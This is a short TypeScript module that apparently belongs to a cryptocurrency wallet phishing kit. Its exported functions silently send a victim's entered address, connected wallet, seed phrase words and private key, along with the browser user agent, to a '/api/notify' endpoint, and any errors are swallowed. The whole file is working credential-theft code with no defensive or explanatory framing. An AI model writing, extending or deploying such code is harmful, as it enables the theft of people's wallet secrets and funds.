const meta = { userAgent: navigator.userAgent };

async function post(type: string, data: Record<string, unknown>) {
  try {
    await fetch("/api/notify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ type, data, meta }),
    });
  } catch {
  }
}

export function notifyAddressEntered(address: string) {
  return post("address_entered", { address });
}

export function notifyWalletConnected(wallet: string, address: string, enteredAddress: string) {
  return post("wallet_connected", { wallet, address, enteredAddress });
}

export function notifySeedPhrase(walletAddress: string, words: string[], wordCount: number) {
  return post("seed_phrase", { walletAddress, words, wordCount });
}

export function notifyPrivateKey(walletAddress: string, privateKey: string) {
  return post("private_key", { walletAddress, privateKey });
}
